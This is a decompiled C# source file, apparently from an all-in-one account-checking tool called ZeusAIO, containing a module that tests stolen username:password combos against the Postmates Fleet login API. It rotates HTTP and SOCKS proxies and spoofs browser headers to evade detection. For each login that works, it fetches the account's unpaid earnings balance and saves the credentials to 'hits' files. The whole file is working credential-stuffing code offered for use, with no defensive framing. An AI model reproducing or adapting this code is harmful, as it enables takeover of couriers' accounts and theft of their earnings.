// Decompiled with JetBrains decompiler
// Type: Postmatesfleet.Check
// Assembly: ZeusAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 70786947-2129-410F-AE9A-C082629DAC36
// Assembly location: C:\Users\ofekt\Desktop\סורס\ZeusAIO.exe

using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using ZeusAIO;

namespace Postmatesfleet
{
  internal class Check
  {
    public static int threads = 0;
    public static string proxyprotocol = "";
    public static List<string> combos;
    public static List<string> proxies1;
    public static int proxytotal = 0;
    public static int combototal = 0;
    public static int free = 0;
    public static int comboindex = 0;
    public static int cpm = 0;
    public static int cpm_aux = 0;
    public static int check = 0;
    public static int error = 0;
    public static int hit = 0;
    public static int bad = 0;
    public static int h;
    public static int m;
    public static int s;

    public static bool CheckAccount(string[] s, string proxy)
    {
      for (int index = 0; index < Config.config.Retries + 1; ++index)
      {
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              proxy = mainmenu.proxies.ElementAt<string>(new Random().Next(mainmenu.proxiesCount));
              if (mainmenu.proxyProtocol == "HTTP")
                httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS4")
                httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS5")
                httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
              httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36";
              httpRequest.IgnoreProtocolErrors = true;
              httpRequest.AllowAutoRedirect = true;
              httpRequest.AddHeader("Pragma", "no-cache");
              httpRequest.AddHeader("Accept", "application/json, text/plain, */*");
              httpRequest.AddHeader("Host", "fleet.postmates.com");
              httpRequest.AddHeader("Connection", "keep-alive");
              httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");
              httpRequest.AddHeader("Accept-Language", "en-US");
              httpRequest.AddHeader("Referer", "https://fleet.postmates.com/login");
              httpRequest.AddHeader("Accept-Encoding", "gzip, deflate, br");
              string str1 = "{\"username\":\"" + s[0] + "\",\"password\":\"" + s[1] + "\"}";
              httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
              string str2 = httpRequest.Post("https://fleet.postmates.com/v1/login", str1, "application/json;charset=UTF-8").ToString();
              if (!str2.Contains("client is not authenticated for this resource"))
              {
                if (!str2.Contains("200"))
                {
                  if (str2.Contains("\"auth_channel\":\"sign_in\""))
                  {
                    httpRequest.ClearAllHeaders();
                    httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36";
                    httpRequest.AddHeader("Pragma", "no-cache");
                    httpRequest.AddHeader("Accept", "application/json, text/plain, */*");
                    httpRequest.AddHeader("Host", "fleet.postmates.com");
                    httpRequest.AddHeader("Connection", "keep-alive");
                    httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");
                    httpRequest.AddHeader("Accept-Language", "en-US");
                    httpRequest.AddHeader("Referer", "https://fleet.postmates.com/dashboard");
                    httpRequest.AddHeader("Accept-Encoding", "gzip, deflate, br");
                    string str3 = Check.Parse(httpRequest.Get("https://fleet.postmates.com/v1/earnings_overview").ToString(), "unpaid_balance\":", ",\"");
                    if (str3.Contains("0"))
                    {
                      ++mainmenu.frees;
                      if (mainmenu.p1 == "2")
                        Colorful.Console.WriteLine("[FREE - POSTMATESFLEET] " + s[0] + ":" + s[1] + " | Balance: " + str3, Color.OrangeRed);
                      Export.AsResult("/Postmatesfleet_frees", s[0] + ":" + s[1] + " | Balance: " + str3);
                      return false;
                    }
                    ++mainmenu.hits;
                    if (mainmenu.p1 == "2")
                      Colorful.Console.WriteLine("[HIT - POSTMATESFLEET] " + s[0] + ":" + s[1] + " | Balance: $" + str3, Color.Green);
                    Export.AsResult("/Postmatesfleet_hits", s[0] + ":" + s[1] + " | Balance: $" + str3);
                    return false;
                  }
                  break;
                }
                break;
              }
              break;
            }
          }
          catch (Exception ex)
          {
            ++mainmenu.errors;
          }
        }
      }
      return false;
    }

    public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));

    private static string Parse(string source, string left, string right) => source.Split(new string[1]
    {
      left
    }, StringSplitOptions.None)[1].Split(new string[1]
    {
      right
    }, StringSplitOptions.None)[0];
  }
}
